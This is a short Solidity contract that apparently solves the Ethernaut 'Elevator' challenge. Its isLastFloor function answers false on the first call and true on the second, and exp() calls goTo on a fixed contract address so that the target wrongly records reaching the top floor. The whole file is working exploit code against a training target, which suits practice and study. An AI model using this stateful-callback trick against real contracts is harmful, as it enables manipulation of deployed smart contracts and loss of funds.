pragma solidity ^0.7.0;
contract Building{
    address public addr=0x5281e051F5Ffe6a683075273658F62CBAad4F7BF;
    bool flag=false;
    function isLastFloor(uint) external returns (bool){
        if(!flag){
            flag=true;
            return false;
        }
        return true;
    }
    function exp() public {
        uint x=1;
        (bool success,bytes memory returnData)=addr.call(abi.encodeWithSelector(bytes4(keccak256("goTo(uint256)")),x));
    }
}